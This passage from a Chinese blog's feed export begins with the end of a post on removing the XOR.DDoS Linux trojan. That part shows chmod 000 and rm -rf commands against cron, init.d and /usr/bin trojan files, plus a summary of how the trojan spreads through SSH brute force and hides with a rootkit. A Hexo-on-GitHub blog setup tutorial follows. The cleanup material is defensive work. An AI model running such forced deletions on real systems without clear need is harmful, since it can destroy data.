src="/images/pasted-25.png" alt="upload successful"><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ll /etc/cron.hourly/   #发现了木马的执行文件位置</span><br></pre></td></tr></table></figure></p><p><img src="/images/pasted-26.png" alt="upload successful"></p><p>7.先对木马文件去权 chmod 000 uzsziblfy.sh ，然后查看里面的文件信息。也可以尝试将木马执行文件下载下来进行反编译，不过一定要先对其去权。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/cron.hourly/ccyfuny.sh</span><br></pre></td></tr></table></figure></p><p><img src="/images/pasted-27.png" alt="upload successful"><br>对其文件去权chmod 000 /usr/bin/ccyfuny</p><p>8.利用ll -aR /etc/rc.d查看木马文件的连接，红色一直在闪烁的是之前删除了的木马。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ll -aR /etc/rc.d</span><br></pre></td></tr></table></figure></p><p><img src="/images/pasted-28.png" alt="upload successful"><br>对其去权 chmod 000 /etc/init.d/ccyfuny</p><p>9.reboot重启系统,然后查看CPU和开放端口以及进程情况。<br>查看top没有发现可疑程序。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">top</span><br></pre></td></tr></table></figure></p><p><img src="/images/pasted-29.png" alt="upload successful"><br>也没发现可疑的进程<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lsof -i</span><br></pre></td></tr></table></figure></p><p><img src="/images/pasted-30.png" alt="upload successful"><br>也没发现可疑的端口开放<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netstat -anlpt</span><br></pre></td></tr></table></figure></p><p><img src="/images/pasted-31.png" alt="upload successful"></p><p>10.所有文件去完权后，接着清除所有的可疑文件：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">rm -rf /usr/bin/ccyfuny ccyfuny.sh</span><br><span class="line">rm -rf /etc/cron.hourly/ccyfuny.sh </span><br><span class="line">rm -rf /etc/init.d/ccyfuny</span><br></pre></td></tr></table></figure></p><p><img src="/images/pasted-32.png" alt="upload successful"><br>11.再reboot重启系统，并没有发现可疑文件了。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">netstat -anlpt</span><br><span class="line">lsof -i</span><br></pre></td></tr></table></figure></p><p><img src="/images/pasted-33.png" alt="upload successful"></p><p><strong>总结，先去除所有可疑执行文件的执行权限，然后重启，再删除所有可疑文件，再重启，就大功告成了。</strong></p><h3 id="0x04-【参考文件】"><a href="#0x04-【参考文件】" class="headerlink" title="0x04 【参考文件】"></a>0x04 【参考文件】</h3><p><a href="https://blog.csdn.net/gosenkle/article/details/80220788" target="_blank" rel="noopener">https://blog.csdn.net/gosenkle/article/details/80220788</a><br><a href="https://blog.csdn.net/rigous/article/details/73970391" target="_blank" rel="noopener">https://blog.csdn.net/rigous/article/details/73970391</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;【前言】&quot;&gt;&lt;a href=&quot;#【前言】&quot; class=&quot;headerlink&quot; title=&quot;【前言】&quot;&gt;&lt;/a&gt;【前言】&lt;/h3&gt;&lt;blockquote&gt;
&lt;p&gt;一种名为“XOR.DDoS”的新型木马出现，该木马能够感染32位和64位的Linux系统，通过安装rootkit来隐藏自身，并可通过DDoS攻击形成僵尸网络。XOR.DDoS木马原理是杀毒软件公司Avast在它们的博客中解释了这种新的威胁，该木马可以根据目标Linux系统环境的不同来相应调整安装方式，并安装一个rootkit来躲避杀毒软件的检测。黑客首先通过SSH暴力登录目标Linux系统，然后尝试获得根用户证书。如果成功，则通过一个shell脚本安装该木马，该shell脚本的功能主要包括：主程序、环境检测、编译、解压、安装等。该木马首先通过受害系统的内核头文件来进行兼容性检测，如果成功匹配则继续安装一个rootkit，以此来隐藏木马自身。&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
      <category term="木马查杀" scheme="http://yoursite.com/categories/%E6%9C%A8%E9%A9%AC%E6%9F%A5%E6%9D%80/"/>
    
    
      <category term="木马查杀" scheme="http://yoursite.com/tags/%E6%9C%A8%E9%A9%AC%E6%9F%A5%E6%9D%80/"/>
    
  </entry>
  
  <entry>
    <title>Hexo-GitHub搭建静态博客平台(Next主题)</title>
    <link href="http://yoursite.com/2018/08/09/Hexo-GitHub%E6%90%AD%E5%BB%BA%E9%9D%99%E6%80%81%E5%8D%9A%E5%AE%A2%E5%B9%B3%E5%8F%B0-Next%E4%B8%BB%E9%A2%98/"/>
    <id>http://yoursite.com/2018/08/09/Hexo-GitHub搭建静态博客平台-Next主题/</id>
    <published>2018-08-09T13:23:00.000Z</published>
    <updated>2018-08-10T10:36:57.481Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>gitHub是一个面向<a href="https://baike.baidu.com/item/%E5%BC%80%E6%BA%90/20720669" target="_blank" rel="noopener">开源</a>及私有<a href="https://baike.baidu.com/item/%E8%BD%AF%E4%BB%B6/12053" target="_blank" rel="noopener">软件</a>项目的托管平台，因为只支持git 作为唯一的版本库格式进行托管，故名gitHub。 Hexo 是一个快速、简洁且高效的博客框架。Hexo 使用 <a href="http://daringfireball.net/projects/markdown/" target="_blank" rel="noopener">Markdown</a>（或其他渲染引擎）解析文章，在几秒内，即可利用靓丽的主题生成静态网页。 </p></blockquote><a id="more"></a> <h3 id="0x01-准备工作"><a href="#0x01-准备工作" class="headerlink" title="0x01 准备工作"></a>0x01 准备工作</h3><h4 id="域名"><a href="#域名" class="headerlink" title="域名"></a>域名</h4><p>我的域名：<a href="http://www.dizai.tech，主要是提升自我逼格，不愿意花钱就跳过此步骤。" target="_blank" rel="noopener">www.dizai.tech，主要是提升自我逼格，不愿意花钱就跳过此步骤。</a><br>国内可以去阿里云或腾讯云购买域名，价格也很便宜。</p><h4 id="环境技术"><a href="#环境技术" class="headerlink" title="环境技术"></a>环境技术</h4><p>前往github官网<a href="https://github.com" target="_blank" rel="noopener">https://github.com</a> 注册一个github账号。<br> <a href="https://hexo.io/zh-cn/" target="_blank" rel="noopener">Hexo</a> 的安装前提就是得有 Node.js 和 Git 。</p><p> 这里，我们要区分清楚git与github。git是一个版本控制的工具，而github有点类似于远程仓库，用于存放用git管理的各种项目。<br> 下面提供相关的官方版本地址，安装教程去网上搜一下就很多。</p><ul><li><p>Node 官方版本安装：<a href="https://nodejs.org/en/" target="_blank" rel="noopener">https://nodejs.org/en/</a> </p></li><li><p>Git 官方版本安装：<a href="https://git-scm.com/download/win" target="_blank" rel="noopener">https://git-scm.com/download/win</a> </p></li><li><p>我用到软件版本（你们可以在官方下载最新版的）</p><p>Git：Git-2.18.0-64-bit </p><p>Node：node-v10.7.0-x64 </p><p>验证安装：任何位置鼠标右击出现Git Bash Here</p><p>cmd下</p></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git --version</span><br></pre></td></tr></table></figure><p><img src="/images/pasted-0.png" alt="upload successful"></p><p>验证安装：cmd下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">node -v</span><br></pre></td></tr></table></figure><p><img src="/images/pasted-1.png" alt="upload successful"></p><h3 id="0x02-Github-配置"><a href="#0x02-Github-配置" class="headerlink" title="0x02 Github 配置"></a>0x02 Github 配置</h3><h4 id="创建仓库-new-repository"><a href="#创建仓库-new-repository" class="headerlink" title="创建仓库 new repository"></a>创建仓库 new repository</h4><p>在自己的GitHub账号下创建一个新的仓库，命名为username.github.io（username 是你的账号名)。</p><p>在这里，要知道，GitHub Pages有两种类型：User/Organization Pages 和 Project Pages，而我所使用的是User Pages。<br> 简单来说，User Pages 与 Project Pages的区别是：</p><ol><li>User Pages 是用来展示用户的，而 Project Pages 是用来展示项目的。</li><li>用于存放 User Pages 的仓库必须使用username.github.io的命名规则，而 Project Pages 则没有特殊的要求。</li><li>User Pages 将使用仓库的 master 分支，而 Project Pages 将使用 gh-pages 分支。</li><li>User Pages 通过 http(s):<a href="http://username.github.io" target="_blank" rel="noopener">//username.github.io</a> 进行访问，而 Projects Pages通过 http(s):<a href="http://username.github.io/projectname" target="_blank" rel="noopener">//username.github.io/projectname</a> 进行访问。</li></ol><p>另外注意：</p><ul><li>注册的邮箱一定要验证，否则不会成功；</li><li>仓库名字必须是：username.github.io，其中username是你的用户名；</li><li>仓库创建成功不会立即生效，需要过一段时间，大概10-30分钟，或者更久，我的等了半个小时才生效；<br><img src="/images/pasted-2.png" alt="upload successful"></li></ul><h3 id="0x03-配置SSH-key"><a href="#0x03-配置SSH-key" class="headerlink" title="0x03 配置SSH key"></a>0x03 配置SSH key</h3><p><strong>用于本地与github数据交换生成并配置key</strong><br>执行如下命令<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git config --global user.name &quot;liuxianan&quot;#你的github用户名</span><br><span class="line">git config --global user.email  &quot;xxx@qq.com&quot;#填写你的github注册邮箱</span><br></pre></td></tr></table></figure></p><p>生成ssh密钥<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd ~/. ssh#检查本机已存在的ssh密钥</span><br><span class="line">ssh-keygen -t rsa -C &quot;邮件地址&quot;#生成密钥</span><br></pre></td></tr></table></figure></p><p>连续按回车三次（使用默认ssh密钥生成策略），密钥生成成功，存于本地用户目录(~)，打开.ssh\id_rsa.pub文件，并复制其中内容</p><p>打开你的github主页，进入个人设置-&gt; SSH and GPG keys -&gt; New SSH key：</p><p>title任意填写，将内容复制到key中即可</p><p><strong>测试ssh</strong><br>本地执行</p><p>ssh -T <a href="mailto:git@github.com" target="_blank" rel="noopener">git@github.com</a>         #注意邮箱地址不用改<br>如果提示Are you sure you want to continue connecting (yes/no)?，输入yes，然后会看到：</p><p>Hi xxx! You’ve successfully authenticated, but GitHub does not provide shell access.</p><p>看到这个信息说明SSH已配置成功！</p><h3 id="0x04-安装hexo"><a href="#0x04-安装hexo" class="headerlink" title="0x04 安装hexo"></a>0x04 安装hexo</h3><p><strong>以下命令都是在git命令行中实现</strong></p><p>首先在本地磁盘中建立一个Hexo文件夹用于存储本地文件(做本地文件保存以及测试使用)<br><img src="/images/pasted-3.png" alt="upload successful"><br>然后在文件夹中右击打开git命令框(我第一次直接在桌面右击，所以命令行无效果) </p><p><img src="/images/pasted-4.png" alt="upload successful"></p><p>在git命令框中安装Hexo</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install -g hexo</span><br></pre></td></tr></table></figure><p><img src="/images/pasted-5.png" alt="upload successful"></p><p>初始化</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexoinit</span><br></pre></td></tr></table></figure><p><img src="/images/pasted-6.png" alt="upload successful"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo init</span><br></pre></td></tr></table></figure><p> 此目录会自动生成hexo相关文件</p><p> 注：此处目录中会存在一个_config.yml的文件，为hexo的主配置文件，以后我们称其为站点配置文件。<br><img src="/images/pasted-7.png" alt="upload successful"></p><h4 id="本地预览"><a href="#本地预览" class="headerlink" title="本地预览"></a>本地预览</h4><p> hexo目录中执行<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hexo clean  #清除缓存</span><br><span class="line">hexo g#生成静态页面</span><br><span class="line">hexo s#启动本地预览服务</span><br></pre></td></tr></table></figure></p><p> 执行命令后，hexo会在public文件夹生成相关html文件，用于本地预览与后期提交github</p><p> 浏览器访问[<a href="http://127.0.0.1:4000或localhost:4000，即可看到hexo默认生成页面hello,world]" target="_blank" rel="noopener">http://127.0.0.1:4000或localhost:4000，即可看到hexo默认生成页面hello,world]</a></p><p><img src="/images/pasted-8.png" alt="upload successful"></p><h3 id="0x05-写博客"><a href="#0x05-写博客" class="headerlink" title="0x05 写博客"></a>0x05 写博客</h3><p>进入hexo根目录</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo new &apos;my-first-blog&apos;</span><br></pre></td></tr></table></figure><p>‘ ‘中为你本篇博客的名称，执行完成后，会自动在\hexo\source_posts\目录下生成.md文件，</p><p>只要打开这个文件就可以写博客了。（.md的文件必须用支持markdown的编辑器）</p><h3 id="0x06-上传到github"><a href="#0x06-上传到github" class="headerlink" title="0x06 上传到github"></a>0x06 上传到github</h3><h4 id="上传前的配置"><a href="#上传前的配置" class="headerlink" title="上传前的配置"></a>上传前的配置</h4><p>配置站点配置文件_config.yml中的deploy部分：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">deploy:</span><br><span class="line">  type: git</span><br><span class="line">  repository: git@github.com:yourname/yourname.github.io.git</span><br><span class="line">  branch: master</span><br></pre></td></tr></table></figure><h4 id="安装上传插件"><a href="#安装上传插件" class="headerlink" title="安装上传插件"></a>安装上传插件</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-deployer-git --save</span><br></pre></td></tr></table></figure><h4 id="上传文件"><a href="#上传文件" class="headerlink" title="上传文件"></a>上传文件</h4><p>在hexo根目录下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo d</span><br></pre></td></tr></table></figure><p>会将有所改动的内容全部提交至github</p><h4 id="常用hexo命令"><a href="#常用hexo命令" class="headerlink" title="常用hexo命令"></a>常用hexo命令</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">hexo new &quot;postName&quot;   #新建文章</span><br><span class="line">hexo new page &quot;pageName&quot;   #新建页面</span><br><span class="line">hexo generate   #生成静态页面至public目录</span><br><span class="line">hexo server   #开启预览访问端口（默认端口4000，&apos;ctrl + c&apos;关闭server）</span><br><span class="line">hexo deploy   #部署到GitHub</span><br><span class="line">hexo help   #查看帮助</span><br><span class="line">hexo version   #查看Hexo的版本</span><br><span class="line">hexo clean   #清除缓存</span><br><span class="line"></span><br><span class="line">缩写：</span><br><span class="line">hexo n == hexo new</span><br><span class="line">hexo g == hexo generate</span><br><span class="line">hexo s == hexo server</span><br><span class="line">hexo d == hexo deploy</span><br><span class="line"></span><br><span class="line">组合命令：</span><br><span class="line">hexo s -g#生成并本地预览</span><br><span class="line">hexo d -g#生成并上传</span><br></pre></td></tr></table></figure><h3 id="0x07-更改默认hexo主题及优化"><a href="#0x07-更改默认hexo主题及优化" class="headerlink" title="0x07 更改默认hexo主题及优化"></a>0x07 更改默认hexo主题及优化</h3><h4 id="主题下载"><a href="#主题下载" class="headerlink" title="主题下载"></a>主题下载</h4><p>进入hexo根目录</p><p>执行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/iissnan/hexo-theme-next themes/next</span><br></pre></td></tr></table></figure><p>执行完成后会在hexo\themes\ 目录下生成next目录</p><p>next目录下也会存在一个_config.yml文件，这是next主题的主配置文件，以后我们称为主题配置文件</p><p>你也可以自己更换自己喜欢的主题<a href="https://hexo.io/themes/" target="_blank" rel="noopener">https://hexo.io/themes/</a> ，官网有很多主题，</p><h4 id="主题应用"><a href="#主题应用" class="headerlink" title="主题应用"></a>主题应用</h4><p>配置站点配置文件</p><p>寻找theme字段，将其值修改为next（next前都有一个空格，否则会报错）</p><h4 id="主题预览"><a href="#主题预览" class="headerlink" title="主题预览"></a>主题预览</h4><p>执行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hexo clean#清除缓存</span><br><span class="line">hexo g#重新生成代码</span><br><span class="line">hexo s#部署到本地</span><br></pre></td></tr></table></figure><p>浏览器访问 <a href="http://127.0.0.1:4000/" target="_blank" rel="noopener">http://127.0.0.1:4000</a> 查看效果</p><h3 id="0x08-主题简单优化"><a href="#0x08-主题简单优化" class="headerlink" title="0x08 主题简单优化"></a>0x08 主题简单优化</h3><h4 id="设置布局"><a href="#设置布局" class="headerlink" title="设置布局"></a>设置布局</h4><p>主题配置文件中</p><p>寻找 Scheme 字段，next提供三种默认主题布局，将你想使用的布局取消注释即可</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#scheme: Muse</span><br><span class="line">#scheme: Mist</span><br><span class="line">scheme: Pisces</span><br></pre></td></tr></table></figure><ul><li>Muse - 默认 Scheme，这是 NexT 最初的版本，黑白主调，大量留白</li><li>Mist - Muse 的紧凑版本，整洁有序的单栏外观</li><li>Pisces - 双栏 Scheme，小家碧玉似的清新</li></ul><h4 id="设置显示语言"><a href="#设置显示语言" class="headerlink" title="设置显示语言"></a>设置显示语言</h4><p>站点配置文件中</p><p>寻找<code>language</code> 字段，设置其值为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">language: zh-Hans</span><br></pre></td></tr></table></figure><p>语言文件位于hexo\themes\next\languages目录下</p><h4 id="设置菜单"><a href="#设置菜单" class="headerlink" title="设置菜单"></a>设置菜单</h4><p>主题配置文件中</p><p>寻找menu字段</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">menu:</span><br><span class="line">  home: / || home     #主页</span><br><span class="line">  categories: /categories/ || th  #分类页</span><br><span class="line">  tags: /tags/ || tags     #标签页</span><br><span class="line">  about: /about/ || user     #关于页</span><br><span class="line">  #archives: /archives/ || archive  #归档页</span><br><span class="line">  #schedule: /schedule/ || calendar</span><br><span class="line">  #sitemap: /sitemap.xml || sitemap</span><br><span class="line">  #commonweal: /404/ || heartbeat     #公益404</span><br></pre></td></tr></table></figure><p>除主页与归档页外，其余页面需要手动创建</p><p>每行中 || 后的内容为指定此menu的图标</p><h4 id="添加标签页"><a href="#添加标签页" class="headerlink" title="添加标签页"></a>添加标签页</h4><p><strong>新建页面</strong></p><p>进入hexo根目录</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo new page tags</span><br></pre></td></tr></table></figure><p>命令执行后，hexo\source\tags目录中生成index.md文件</p><p><strong>设置页面类型</strong></p><p>修改此index.md文件为(添加type行)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">title: tags</span><br><span class="line">date: 2016-11-15 19:10:05</span><br><span class="line">type: &quot;tags&quot;</span><br></pre></td></tr></table></figure><p><strong>设置具体博客文章tags</strong></p><p>对于hexo\source_post目录下具体博客文章设置tags(设置tags行)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">title: 基于Hexo和Github搭建博客</span><br><span class="line">date: 2016-11-09</span><br><span class="line">tags: [npm, hexo, github]</span><br></pre></td></tr></table></figure><h4 id="添加分类页面"><a href="#添加分类页面" class="headerlink" title="添加分类页面"></a>添加分类页面</h4><p><strong>新建页面</strong></p><p>进入hexo根目录</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo new page categories</span><br></pre></td></tr></table></figure><p>命令执行后，hexo\source\categories目录中生成index.md文件</p><p><strong>设置页面类型</strong></p><p>修改此index.md文件为(添加categories行)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">title: categories</span><br><span class="line">date: 2016-11-15 19:11:13</span><br><span class="line">type: &quot;categories&quot;</span><br></pre></td></tr></table></figure><p><strong>设置具体博客文章categories</strong></p><p>对于hexo\source_post目录下具体博客文章设置categories(设置categories行)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">title: 基于Hexo和Github搭建博客</span><br><span class="line">date: 2016-11-09</span><br><span class="line">tags: [npm, hexo, github]</span><br><span class="line">categories: 搭建博客</span><br></pre></td></tr></table></figure><h4 id="添加关于页面"><a href="#添加关于页面" class="headerlink" title="添加关于页面"></a>添加关于页面</h4><p><strong>添加页面</strong></p><p>进入hexo根目录</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo new page about</span><br></pre></td></tr></table></figure><p>命令执行后，hexo\source\about目录中生成index.md文件</p><p><strong>修改index.md文件</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">title: about</span><br><span class="line">date: 2016-11-15 19:08:50</span><br><span class="line">## 关于我</span><br><span class="line"></span><br><span class="line">一只学习的小菜鸟，欢迎分享知识。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">QQ：</span><br><span class="line">Email:</span><br></pre></td></tr></table></figure><h4 id="设置站内搜索"><a href="#设置站内搜索" class="headerlink" title="设置站内搜索"></a>设置站内搜索</h4><p>进入hexo根目录</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-generator-searchdb --save</span><br></pre></td></tr></table></figure><p>站点配置文件中添加</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">search:</span><br><span class="line">  path: search.xml</span><br><span class="line">  field: post</span><br><span class="line">  format: html</span><br><span class="line">  limit: 10000</span><br></pre></td></tr></table></figure><h3 id="0x09-其他设置"><a href="#0x09-其他设置" class="headerlink" title="0x09 其他设置"></a>0x09 其他设置</h3><h4 id="hexo-首页文章只显示一部分"><a href="#hexo-首页文章只显示一部分" class="headerlink" title="hexo 首页文章只显示一部分"></a>hexo 首页文章只显示一部分</h4><p>在博客文章适当位置添加<code>&lt;!--more--&gt;</code> 标记即可</p><h4 id="网站底部字数统计"><a href="#网站底部字数统计" class="headerlink" title="网站底部字数统计"></a>网站底部字数统计</h4><p>进入hexo根目录</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-wordcount --save</span><br></pre></td></tr></table></figure><p>hexo\themes\next\/layout_partials\footer.swig文件中末尾添加</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;div class=&quot;theme-info&quot;&gt;</span><br><span class="line">  &lt;div class=&quot;powered-by&quot;&gt;&lt;/div&gt;</span><br><span class="line">  &lt;span class=&quot;post-count&quot;&gt;博客全站共&#123;&#123; totalcount(site) &#125;&#125;字&lt;/span&gt;</span><br><span class="line">&lt;/div&gt;</span><br></pre></td></tr></table></figure><h4 id="修改文章底部的带-号的标签"><a href="#修改文章底部的带-号的标签" class="headerlink" title="修改文章底部的带#号的标签"></a>修改文章底部的带#号的标签</h4><p>修改hexo\themes\next\layout_macro\post.swig文件，搜索<code>rel=&quot;tag&quot;&gt;#</code> ，改为<code>&lt;i class=&quot;fa fa-tag&quot;&gt;&lt;/i&gt;</code></p><h4 id="在每篇文章末尾统一添加“本文结束”标记"><a href="#在每篇文章末尾统一添加“本文结束”标记" class="headerlink" title="在每篇文章末尾统一添加“本文结束”标记"></a>在每篇文章末尾统一添加“本文结束”标记</h4><p>在hexo\themes\next\layout_macro目录下，新建<code>passage-end-tag.swig</code> ，并添加如下内容</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;div&gt;</span><br><span class="line">    &#123;% if not is_index %&#125;</span><br><span class="line">        &lt;div style=&quot;text-align:center;color: #ccc;font-size:14px;&quot;&gt;-------------本文结束&lt;i class=&quot;fa fa-paw&quot;&gt;&lt;/i&gt;感谢您的阅读-------------&lt;/div&gt;</span><br><span class="line">    &#123;% endif %&#125;</span><br><span class="line">&lt;/div&gt;</span><br></pre></td></tr></table></figure><p>接着打开hexo\themes\next\layout_macro\post.swig<code>文件，在</code>post-body 之后添加</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;div&gt;</span><br><span class="line">  &#123;% if not is_index %&#125;</span><br><span class="line">    &#123;% include &apos;passage-end-tag.swig&apos; %&#125;</span><br><span class="line">  &#123;% endif %&#125;</span><br><span class="line">&lt;/div&gt;</span><br></pre></td></tr></table></figure><p><img src="\\images\pasted-9.png\" alt="upload successful"></p><p>打开主题配置文件，在末尾添加</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># 文章末尾添加“本文结束”标记</span><br><span class="line">passage_end_tag:</span><br><span class="line">  enabled: true</span><br></pre></td></tr></table></figure><h3 id="0x010-访问线上博客"><a href="#0x010-访问线上博客" class="headerlink" title="0x010 访问线上博客"></a>0x010 访问线上博客</h3><h4 id="执行"><a href="#执行" class="headerlink" title="执行"></a>执行</h4><p>hexo clean<br>hexo g<br>hexo d<br>浏览器访问<a href="https://yourname.github.io" target="_blank" rel="noopener">https://yourname.github.io</a> （yourname是你的github用户名）</p><p>设置域名解析<br>ping一下你的博客域名，获取其IP地址</p><p><img src="\\images\pasted-12.png\" alt="upload successful"></p><p>在阿里云或腾讯云设置域名解析</p><p><img src="/images/pasted-10.png" alt="upload successful"></p><p><img src="/images/pasted-11.png" alt="upload successful"></p><p>在Hexo目录下的source中建一个CNAME命名的文件夹(切记没有后缀)</p><p>右键新建txt文本-&gt;输入你购买的域名<a href="http://www.ainusers.top-&gt;保存关闭" target="_blank" rel="noopener">www.ainusers.top-&gt;保存关闭</a></p><p>然后快捷键F2或者右键该文本重命名-&gt;将.txt后缀去掉-&gt;会提示文件不可用继续确定即可<br><img src="/images/pasted-13.png" alt="upload successful"></p><h4 id="上传"><a href="#上传" class="headerlink" title="上传"></a>上传</h4><p><strong>进入hexo目录</strong></p><p>hexo clean<br>hexo g<br>hexo d<br>即可使用自定义域名访问博客，并且原博客域名也不会失效</p><h3 id="Hexo-Admin后台管理博客工具"><a href="#Hexo-Admin后台管理博客工具" class="headerlink" title="Hexo Admin后台管理博客工具"></a>Hexo Admin后台管理博客工具</h3><p>使用hexo+github确实非常方便管理自己的知识，但是缺点在于每次在本地使用markdown工具写完笔记，都要进行生成静态页面，然后本地预览或者上传github操作，操作非常繁琐。所以在这里配置使用Hexo Admin工具对博客进行管理，简化操作。</p><h4 id="Hexo-Admin介绍"><a href="#Hexo-Admin介绍" class="headerlink" title="Hexo Admin介绍"></a>Hexo Admin介绍</h4><p>官方网站：<a href="https://jaredforsyth.com/hexo-admin/" target="_blank" rel="noopener">https://jaredforsyth.com/hexo-admin/</a><br>属于hexo插件系列，使用B/S架构对博客进行后台管理</p><p><strong>安装</strong><br>进入/hexo目录git bash下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install --save hexo-admin</span><br></pre></td></tr></table></figure></p><p><img src="/images/pasted-15.png" alt="upload successful"><br>访问hexo后台管理界面git bash下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo server -d</span><br></pre></td></tr></table></figure></p><p><img src="/images/pasted-16.png" alt="upload successful"></p><p>访问<a href="http://localhost:4000/即可访问本地博客" target="_blank" rel="noopener">http://localhost:4000/即可访问本地博客</a></p><p>访问<a href="http://localhost:4000/admin即可进入Hexo" 